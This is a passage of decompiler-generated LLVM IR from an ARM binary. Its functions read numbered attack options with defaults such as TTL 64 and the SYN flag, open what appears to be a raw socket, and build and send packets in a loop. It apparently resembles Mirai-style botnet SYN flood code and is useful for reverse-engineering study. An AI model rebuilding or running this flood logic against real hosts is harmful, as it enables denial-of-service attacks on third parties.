  store i32 %v5_bb90, i32* %ip.global-to-local, align 4
  %v9_bfc0 = icmp eq i32 %v5_bb90, %v1_bfc0
  store i1 %v9_bfc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfc0, label %dec_label_pc_c130, label %dec_label_pc_bfc8

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_c11c.dec_label_pc_bfc8_crit_edge, %dec_label_pc_bfbc
  %v1_bfcc = phi i32 [ %v1_bfcc.pre, %dec_label_pc_c11c.dec_label_pc_bfc8_crit_edge ], [ %v1_bfc0, %dec_label_pc_bfbc ]
  store i32 %v6_bbac, i32* %r0.global-to-local, align 4
  %v9_bfcc = icmp eq i32 %v6_bbac, %v1_bfcc
  store i1 %v9_bfcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfcc, label %dec_label_pc_c144, label %dec_label_pc_bfd4

dec_label_pc_bfd4:                                ; preds = %dec_label_pc_c130, %dec_label_pc_bfc8
  store i32 %v1_bc7c, i32* %r1.global-to-local, align 4
  store i1 %v2_c14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c14c, label %dec_label_pc_bfe0, label %dec_label_pc_c158

dec_label_pc_bfe0:                                ; preds = %dec_label_pc_bfd4, %dec_label_pc_c144, %dec_label_pc_c158
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_bfe4 = load i32, i32* @r5, align 4
  %v3_bfe4 = add i32 %v2_bfe4, 10
  %v4_bfe4 = inttoptr i32 %v3_bfe4 to i16*
  store i16 0, i16* %v4_bfe4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bfec = load i32, i32* @r5, align 4
  store i32 %v0_bfec, i32* @r0, align 4
  %v2_bff0 = call i32 @function_c848(i32 %v0_bfec, i32 20)
  %v3_bff0 = trunc i32 %v2_bff0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_bff8 = load i32, i32* @r5, align 4
  %v4_bff8 = add i32 %v3_bff8, 10
  %v5_bff8 = inttoptr i32 %v4_bff8 to i16*
  store i16 %v3_bff0, i16* %v5_bff8, align 2
  %v0_bffc = load i32, i32* @r6, align 4
  store i32 %v0_bffc, i32* @r1, align 4
  %v0_c000 = load i32, i32* %r3.global-to-local, align 4
  %v1_c000 = trunc i32 %v0_c000 to i16
  %v3_c000 = add i32 %v0_bffc, 16
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v1_c000, i16* %v4_c000, align 2
  %v0_c004 = load i32, i32* @sl, align 4
  store i32 %v0_c004, i32* %r2.global-to-local, align 4
  %v0_c008 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c008, i32* %r3.global-to-local, align 4
  %v0_c00c = load i32, i32* @r5, align 4
  store i32 %v0_c00c, i32* %r0.global-to-local, align 4
  %v4_c010 = call i32 @function_c898(i32 %v0_c00c, i32 %v0_bffc, i32 %v0_c004, i32 %v0_c008)
  %v5_c010 = trunc i32 %v4_c010 to i16
  store i32 %v4_c010, i32* %r0.global-to-local, align 4
  %v3_c014 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c014, i32* %r3.global-to-local, align 4
  %v3_c018 = mul i32 %v3_c014, 32
  store i32 %v3_c018, i32* %lr.global-to-local, align 4
  %v3_c01c = load i32, i32* @r6, align 4
  %v4_c01c = add i32 %v3_c01c, 16
  %v5_c01c = inttoptr i32 %v4_c01c to i16*
  store i16 %v5_c010, i16* %v5_c01c, align 2
  %v0_c020 = load i32, i32* %lr.global-to-local, align 4
  %v1_c020 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c020, -8
  %v5_c020 = add i32 %v0_c020, %tmp78
  store i32 %v5_c020, i32* %lr.global-to-local, align 4
  %v0_c024 = load i32, i32* @r6, align 4
  %v1_c024 = add i32 %v0_c024, 2
  %v2_c024 = inttoptr i32 %v1_c024 to i16*
  %v3_c024 = load i16, i16* %v2_c024, align 2
  %v1_c028 = load i32, i32* @r8, align 4
  %v2_c028 = add i32 %v1_c028, %v5_c020
  store i32 %v2_c028, i32* @lr, align 4
  %v3_c02c = add i32 %v2_c028, 2
  %v4_c02c = inttoptr i32 %v3_c02c to i16*
  store i16 %v3_c024, i16* %v4_c02c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c038 = load i32, i32* @r5, align 4
  store i32 %v0_c038, i32* %r1.global-to-local, align 4
  store i32 %v3_bca4, i32* %r0.global-to-local, align 4
  %v0_c040 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c040, i32* %r2.global-to-local, align 4
  %v0_c044 = load i32, i32* @lr, align 4
  %v6_c04c = call i32 @function_11338(i32 %v3_bca4, i32 %v0_c038, i32 %v0_c040, i32 16384, i32 %v0_c044, i32 16)
  %v3_c050 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c050, i32* %r3.global-to-local, align 4
  %v1_c054 = add i32 %v3_c050, 1
  store i32 %v1_c054, i32* %r0.global-to-local, align 4
  %v1_c058 = load i32, i32* @r7, align 4
  %v9_c058 = icmp eq i32 %v1_c054, %v1_c058
  store i1 %v9_c058, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c054, i32* %stack_var_-44, align 4
  %v5_c060 = icmp slt i32 %v1_c054, %v1_c058
  br i1 %v5_c060, label %dec_label_pc_bf60, label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_bfe0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c068 = icmp eq i32 %v1_c058, 0
  store i1 %v2_c068, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c068, label %dec_label_pc_bf4c, label %dec_label_pc_bf5c

dec_label_pc_c078:                                ; preds = %dec_label_pc_bf60
  %v1_c078 = add i32 %v2_bf68, 16
  %v2_c078 = inttoptr i32 %v1_c078 to i32*
  %v3_c078 = load i32, i32* %v2_c078, align 4
  %v0_c07c = call i32 @function_e094()
  store i32 %v0_c07c, i32* %r0.global-to-local, align 4
  %v3_c080 = load i32, i32* %stack_var_-44, align 4
  %v5_c088 = mul i32 %v3_c080, 24
  %v1_c08c = and i32 %v3_c078, 16711680
  store i32 %v1_c08c, i32* %ip.global-to-local, align 4
  %v3_c090 = udiv i32 %v3_c078, 16777216
  %v4_c094 = udiv i32 %v1_c08c, 256
  %v5_c094 = or i32 %v4_c094, %v3_c090
  store i32 %v5_c094, i32* %r2.global-to-local, align 4
  %v1_c098 = load i32, i32* @r8, align 4
  %v2_c098 = add i32 %v1_c098, %v5_c088
  store i32 %v2_c098, i32* %r1.global-to-local, align 4
  %v1_c09c = and i32 %v3_c078, 65280
  store i32 %v1_c09c, i32* %r3.global-to-local, align 4
  %v1_c0a0 = add i32 %v2_c098, 20
  %v2_c0a0 = inttoptr i32 %v1_c0a0 to i8*
  %v3_c0a0 = load i8, i8* %v2_c0a0, align 1
  %v4_c0a0 = zext i8 %v3_c0a0 to i32
  store i32 %v4_c0a0, i32* %ip.global-to-local, align 4
  %v5_c0a8 = call i32 @llvm.bswap.i32(i32 %v3_c078)
  %v7_c0ac = lshr i32 %v0_c07c, %v4_c0a0
  %v8_c0ac = add i32 %v7_c0ac, %v5_c0a8
  store i32 %v8_c0ac, i32* %r2.global-to-local, align 4
  %v1_c0bc = and i32 %v8_c0ac, 65280
  store i32 %v1_c0bc, i32* %r1.global-to-local, align 4
  store i32 %v6_bc90, i32* %r0.global-to-local, align 4
  %v5_c0c8 = call i32 @llvm.bswap.i32(i32 %v8_c0ac)
  store i32 %v5_c0c8, i32* %r3.global-to-local, align 4
  store i1 %v7_bf88, i1* %cpsr_z.global-to-local, align 1
  %v1_c0d0 = load i32, i32* @r5, align 4
  %v2_c0d0 = add i32 %v1_c0d0, 16
  %v3_c0d0 = inttoptr i32 %v2_c0d0 to i32*
  store i32 %v5_c0c8, i32* %v3_c0d0, align 4
  br i1 %v2_bf88, label %dec_label_pc_c0d8, label %dec_label_pc_bf90

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c078, %dec_label_pc_bf84
  %v0_c0d8 = call i32 @function_e094()
  store i32 %v0_c0d8, i32* %r0.global-to-local, align 4
  store i32 %v3_bcec, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c0e8, i1* %cpsr_z.global-to-local, align 1
  %v1_c0ec = load i32, i32* @r5, align 4
  %v2_c0ec = add i32 %v1_c0ec, 12
  %v3_c0ec = inttoptr i32 %v2_c0ec to i32*
  store i32 %v0_c0d8, i32* %v3_c0ec, align 4
  br i1 %v3_c0e8, label %dec_label_pc_c0f4, label %dec_label_pc_c0d8.dec_label_pc_bfa4_crit_edge

dec_label_pc_c0d8.dec_label_pc_bfa4_crit_edge:    ; preds = %dec_label_pc_c0d8
  %v1_bfa8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfa4

dec_label_pc_c0f4:                                ; preds = %dec_label_pc_c0d8, %dec_label_pc_bf90
  %v0_c0f4 = call i32 @function_e094()
  %v1_c0f4 = trunc i32 %v0_c0f4 to i16
  store i32 %v0_c0f4, i32* %r0.global-to-local, align 4
  store i32 %v3_bcf0, i32* %r2.global-to-local, align 4
  %v1_c0fc = load i32, i32* @r4, align 4
  %v9_c0fc = icmp eq i32 %v3_bcf0, %v1_c0fc
  store i1 %v9_c0fc, i1* %cpsr_z.global-to-local, align 1
  %v3_c100 = load i32, i32* @r5, align 4
  %v4_c100 = add i32 %v3_c100, 4
  %v5_c100 = inttoptr i32 %v4_c100 to i16*
  store i16 %v1_c0f4, i16* %v5_c100, align 2
  br i1 %v9_c0fc, label %dec_label_pc_c108, label %dec_label_pc_c0f4.dec_label_pc_bfb0_crit_edge

dec_label_pc_c0f4.dec_label_pc_bfb0_crit_edge:    ; preds = %dec_label_pc_c0f4
  %v1_bfb4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfb0

dec_label_pc_c108:                                ; preds = %dec_label_pc_c0f4, %dec_label_pc_bfa4
  %v0_c108 = call i32 @function_e094()
  %v1_c108 = trunc i32 %v0_c108 to i16
  store i32 %v0_c108, i32* %r0.global-to-local, align 4
  store i32 %v3_bcf4, i32* %r3.global-to-local, align 4
  %v1_c110 = load i32, i32* @r4, align 4
  %v9_c110 = icmp eq i32 %v3_bcf4, %v1_c110
  store i1 %v9_c110, i1* %cpsr_z.global-to-local, align 1
  %v3_c114 = load i32, i32* @r5, align 4
  %v4_c114 = add i32 %v3_c114, 20
  %v5_c114 = inttoptr i32 %v4_c114 to i16*
  store i16 %v1_c108, i16* %v5_c114, align 2
  br i1 %v9_c110, label %dec_label_pc_c11c, label %dec_label_pc_c108.dec_label_pc_bfbc_crit_edge

dec_label_pc_c108.dec_label_pc_bfbc_crit_edge:    ; preds = %dec_label_pc_c108
  %v1_bfc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfbc

dec_label_pc_c11c:                                ; preds = %dec_label_pc_c108, %dec_label_pc_bfb0
  %v0_c11c = call i32 @function_e094()
  %v1_c11c = trunc i32 %v0_c11c to i16
  store i32 %v0_c11c, i32* %r0.global-to-local, align 4
  store i32 %v5_bb90, i32* %ip.global-to-local, align 4
  %v1_c124 = load i32, i32* @r4, align 4
  %v9_c124 = icmp eq i32 %v5_bb90, %v1_c124
  store i1 %v9_c124, i1* %cpsr_z.global-to-local, align 1
  %v3_c128 = load i32, i32* @r6, align 4
  %v4_c128 = add i32 %v3_c128, 2
  %v5_c128 = inttoptr i32 %v4_c128 to i16*
  store i16 %v1_c11c, i16* %v5_c128, align 2
  br i1 %v9_c124, label %dec_label_pc_c130, label %dec_label_pc_c11c.dec_label_pc_bfc8_crit_edge

dec_label_pc_c11c.dec_label_pc_bfc8_crit_edge:    ; preds = %dec_label_pc_c11c
  %v1_bfcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfc8

dec_label_pc_c130:                                ; preds = %dec_label_pc_c11c, %dec_label_pc_bfbc
  %v0_c130 = call i32 @function_e094()
  %v1_c134 = load i32, i32* @r6, align 4
  %v2_c134 = add i32 %v1_c134, 4
  %v3_c134 = inttoptr i32 %v2_c134 to i32*
  store i32 %v0_c130, i32* %v3_c134, align 4
  store i32 %v6_bbac, i32* %r0.global-to-local, align 4
  %v1_c13c = load i32, i32* @r4, align 4
  %v9_c13c = icmp eq i32 %v6_bbac, %v1_c13c
  store i1 %v9_c13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c13c, label %dec_label_pc_c144, label %dec_label_pc_bfd4

dec_label_pc_c144:                                ; preds = %dec_label_pc_c130, %dec_label_pc_bfc8
  %v0_c144 = call i32 @function_e094()
  store i32 %v0_c144, i32* %r0.global-to-local, align 4
  store i32 %v1_bc7c, i32* %r1.global-to-local, align 4
  store i1 %v2_c14c, i1* %cpsr_z.global-to-local, align 1
  %v1_c150 = load i32, i32* @r6, align 4
  %v2_c150 = add i32 %v1_c150, 8
  %v3_c150 = inttoptr i32 %v2_c150 to i32*
  store i32 %v0_c144, i32* %v3_c150, align 4
  br i1 %v2_c14c, label %dec_label_pc_bfe0, label %dec_label_pc_c158

dec_label_pc_c158:                                ; preds = %dec_label_pc_bfd4, %dec_label_pc_c144
  %v0_c158 = load i32, i32* @r5, align 4
  %v1_c158 = add i32 %v0_c158, 40
  store i32 %v1_c158, i32* %r0.global-to-local, align 4
  store i32 %v6_bc54, i32* %r1.global-to-local, align 4
  %v2_c160 = inttoptr i32 %v1_c158 to i16*
  %v3_c160 = call i32 @function_e228(i16* %v2_c160, i32 %v6_bc54)
  store i32 %v3_c160, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfe0

dec_label_pc_c168:                                ; preds = %dec_label_pc_bcb4
  store i32 %v3_bca4, i32* %r0.global-to-local, align 4
  %v1_c16c = call i32 @function_10be0(i32 %v3_bca4)
  store i32 %v1_c16c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c170

dec_label_pc_c170:                                ; preds = %dec_label_pc_baa4, %dec_label_pc_c168
  %v1_c178 = phi i32 [ %v3_bca4, %dec_label_pc_baa4 ], [ %v1_c16c, %dec_label_pc_c168 ]
  store i32 %v18_baa4, i32* %sb.global-to-local, align 4
  store i32 %v24_baa4, i32* %fp.global-to-local, align 4
  store i32 %v27_baa4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c178

dec_label_pc_c17c:                                ; preds = %dec_label_pc_bcdc
  store i32 %v6_bc54, i32* %r0.global-to-local, align 4
  %v1_c184 = add i32 %v6_bc54, 20
  store i32 %v1_c184, i32* %sb.global-to-local, align 4
  %v3_c188 = mul i32 %v6_bc54, 65536
  store i32 %v3_c188, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bf38

; uselistorder directives
  uselistorder i32 %v0_c11c, { 1, 0 }
  uselistorder i32 %v0_c108, { 1, 0 }
  uselistorder i32 %v0_c0f4, { 1, 0 }
  uselistorder i32 %v5_c0c8, { 1, 0 }
  uselistorder i32 %v3_c078, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c054, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c020, { 1, 0 }
  uselistorder i32 %v4_c010, { 1, 0 }
  uselistorder i1 %v7_bf88, { 2, 1, 0 }
  uselistorder i1 %v2_c14c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c0e8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_bf1c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bef0, { 1, 0 }
  uselistorder i32 %v1_bda4, { 1, 2, 0 }
  uselistorder i32 %v1_bda0, { 2, 1, 0 }
  uselistorder i32 %v1_bd9c, { 2, 0, 1 }
  uselistorder i32 %v1_bd98, { 2, 0, 1 }
  uselistorder i32 %v1_bd94, { 2, 0, 1 }
  uselistorder i32 %v1_bd6c, { 1, 0 }
  uselistorder i32 %v3_bd14, { 1, 0 }
  uselistorder i32 %v3_bcec, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bce4, { 1, 0, 2 }
  uselistorder i32 %v0_bce0, { 1, 0, 2 }
  uselistorder i32 %v0_bcdc, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bcd4, { 1, 0 }
  uselistorder i1 %v7_bca8, { 1, 0 }
  uselistorder i32 %v3_bca4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bc90, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bc7c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bc54, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bbac, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bb90, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bb40, { 1, 0 }
  uselistorder i32 %v2_bac0, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i16 64, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c170, { 1, 0 }
  uselistorder label %dec_label_pc_c158, { 1, 0 }
  uselistorder label %dec_label_pc_bfe0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf5c, { 1, 0 }
  uselistorder label %dec_label_pc_bf4c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c19c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c19c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c19c = load i32, i32* @r4, align 4
  %v24_c19c = load i32, i32* @fp, align 4
  %v27_c19c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c1b8 = call i32 @function_11f24(i32 %arg1, i32 4)
  %v0_c1bc = load i32, i32* @r5, align 4
  store i32 %v0_c1bc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c1b8, i32* @sb, align 4
  %v0_c1cc = load i32, i32* @r4, align 4
  store i32 %v0_c1cc, i32* %r0.global-to-local, align 4
  %v4_c1d0 = inttoptr i32 %v0_c1bc to i32*
  %v5_c1d0 = call i32 @function_8570(i32 %v0_c1cc, i32* %v4_c1d0, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c1e8 = load i32, i32* @r5, align 4
  store i32 %v0_c1e8, i32* %r1.global-to-local, align 4
  %v0_c1ec = load i32, i32* @r4, align 4
  store i32 %v0_c1ec, i32* %r0.global-to-local, align 4
  %v5_c1f0 = trunc i32 %v5_c1d0 to i8
  %v6_c1f4 = inttoptr i32 %v0_c1e8 to i32*
  %v7_c1f4 = call i32 @function_8570(i32 %v0_c1ec, i32* %v6_c1f4, i32 3, i32 65535)
  %v0_c1f8 = load i32, i32* @r5, align 4
  store i32 %v0_c1f8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c208 = load i32, i32* @r4, align 4
  store i32 %v0_c208, i32* %r0.global-to-local, align 4
  %v5_c20c = inttoptr i32 %v0_c1f8 to i32*
  %v6_c20c = call i32 @function_8570(i32 %v0_c208, i32* %v5_c20c, i32 4, i32 64)
  %v1_c214 = urem i32 %v6_c20c, 256
  %v0_c218 = load i32, i32* @r5, align 4
  store i32 %v0_c218, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c224 = load i32, i32* @r4, align 4
  store i32 %v0_c224, i32* %r0.global-to-local, align 4
  %v6_c22c = inttoptr i32 %v0_c218 to i32*
  %v7_c22c = call i32 @function_8570(i32 %v0_c224, i32* %v6_c22c, i32 5, i32 1)
  %v1_c238 = urem i32 %v7_c22c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c244 = load i32, i32* @r5, align 4
  store i32 %v0_c244, i32* %r1.global-to-local, align 4
  %v0_c248 = load i32, i32* @r4, align 4
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  %v5_c250 = inttoptr i32 %v0_c244 to i32*
  %v6_c250 = call i32 @function_8570(i32 %v0_c248, i32* %v5_c250, i32 6, i32 65535)
  %v0_c258 = load i32, i32* @r5, align 4
  store i32 %v0_c258, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c250, i32* %fp.global-to-local, align 4
  %v0_c268 = load i32, i32* @r4, align 4
  store i32 %v0_c268, i32* %r0.global-to-local, align 4
  %v4_c26c = inttoptr i32 %v0_c258 to i32*
  %v5_c26c = call i32 @function_8570(i32 %v0_c268, i32* %v4_c26c, i32 7, i32 65535)
  %v0_c274 = load i32, i32* @r5, align 4
  store i32 %v0_c274, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c26c, i32* @r6, align 4
  %v0_c284 = load i32, i32* @r4, align 4
  store i32 %v0_c284, i32* %r0.global-to-local, align 4
  %v4_c288 = inttoptr i32 %v0_c274 to i32*
  %v5_c288 = call i32 @function_8570(i32 %v0_c284, i32* %v4_c288, i32 17, i32 65535)
  %v0_c28c = load i32, i32* @r5, align 4
  store i32 %v0_c28c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c29c = load i32, i32* @r4, align 4
  store i32 %v0_c29c, i32* %r0.global-to-local, align 4
  %v5_c2a0 = inttoptr i32 %v0_c28c to i32*
  %v6_c2a0 = call i32 @function_8570(i32 %v0_c29c, i32* %v5_c2a0, i32 18, i32 0)
  %v0_c2a4 = load i32, i32* @r5, align 4
  store i32 %v0_c2a4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2b4 = load i32, i32* @r4, align 4
  store i32 %v0_c2b4, i32* %r0.global-to-local, align 4
  %v5_c2b8 = inttoptr i32 %v0_c2a4 to i32*
  %v6_c2b8 = call i32 @function_8570(i32 %v0_c2b4, i32* %v5_c2b8, i32 11, i32 0)
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2cc = load i32, i32* @r4, align 4
  store i32 %v0_c2cc, i32* %r0.global-to-local, align 4
  %v5_c2d0 = inttoptr i32 %v0_c2bc to i32*
  %v6_c2d0 = call i32 @function_8570(i32 %v0_c2cc, i32* %v5_c2d0, i32 12, i32 0)
  %v0_c2d4 = load i32, i32* @r5, align 4
  store i32 %v0_c2d4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 %v0_c2e4, i32* %r0.global-to-local, align 4
  %v5_c2e8 = inttoptr i32 %v0_c2d4 to i32*
  %v6_c2e8 = call i32 @function_8570(i32 %v0_c2e4, i32* %v5_c2e8, i32 13, i32 0)
  %v0_c2ec = load i32, i32* @r5, align 4
  store i32 %v0_c2ec, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2fc = load i32, i32* @r4, align 4
  store i32 %v0_c2fc, i32* %r0.global-to-local, align 4
  %v5_c300 = inttoptr i32 %v0_c2ec to i32*
  %v6_c300 = call i32 @function_8570(i32 %v0_c2fc, i32* %v5_c300, i32 14, i32 0)
  %v0_c304 = load i32, i32* @r5, align 4
  store i32 %v0_c304, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c314 = load i32, i32* @r4, align 4
  store i32 %v0_c314, i32* %r0.global-to-local, align 4
  %v5_c318 = inttoptr i32 %v0_c304 to i32*
  %v6_c318 = call i32 @function_8570(i32 %v0_c314, i32* %v5_c318, i32 15, i32 1)
  %v0_c31c = load i32, i32* @r5, align 4
  store i32 %v0_c31c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c32c = load i32, i32* @r4, align 4
  store i32 %v0_c32c, i32* %r0.global-to-local, align 4
  %v5_c330 = inttoptr i32 %v0_c31c to i32*
  %v6_c330 = call i32 @function_8570(i32 %v0_c32c, i32* %v5_c330, i32 16, i32 0)
  %v2_c33c = load i32, i32* @global_var_20780.45, align 4
  store i32 %v2_c33c, i32* %r3.global-to-local, align 4
  %v0_c340 = load i32, i32* @r5, align 4
  store i32 %v0_c340, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c348 = load i32, i32* @r4, align 4
  store i32 %v0_c348, i32* %r0.global-to-local, align 4
  %v5_c34c = inttoptr i32 %v0_c340 to i32*
  %v6_c34c = call i32 @function_8504(i32 %v0_c348, i32* %v5_c34c, i32 25, i32 %v2_c33c, i32 %v6_c330)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c360 = call i32 @function_113bc(i32 2, i32 3, i32 6)
  store i32 %v3_c360, i32* %r0.global-to-local, align 4
  %v7_c364 = icmp eq i32 %v3_c360, -1
  store i1 %v7_c364, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c360, i32* @sl, align 4
  br i1 %v7_c364, label %dec_label_pc_c838, label %dec_label_pc_c370

dec_label_pc_c370:                                ; preds = %dec_label_pc_c19c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c378 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c378, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c38c = call i32 @function_11378(i32 %v3_c360, i32 0, i32 3, i32 %v6_c378, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c38c, i32* %r0.global-to-local, align 4
  %v7_c390 = icmp eq i32 %v5_c38c, -1
  store i1 %v7_c390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c390, label %dec_label_pc_c830, label %dec_label_pc_c398

dec_label_pc_c398:                                ; preds = %dec_label_pc_c370
  %v3_c3a0 = mul i32 %v7_c1f4, 65536
  store i32 %v3_c3a0, i32* %r0.global-to-local, align 4
  %v0_c3a4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c3a4 = mul i32 %v0_c3a4, 65536
  store i32 %v3_c3a4, i32* %r4.global-to-local, align 4
  %v0_c3a8 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c2b8, i32* %r2.global-to-local, align 4
  %v3_c3b4 = urem i32 %v7_c1f4, 65536
  store i32 %v3_c3b4, i32* %r3.global-to-local, align 4
  %v3_c3b8 = urem i32 %v0_c3a4, 65536
  %v3_c3bc = urem i32 %v0_c3a8, 65536
  store i32 %v3_c3bc, i32* %r1.global-to-local, align 4
  %v0_c3c0 = load i32, i32* @r7, align 4
  %v2_c3c0 = icmp eq i32 %v0_c3c0, 0
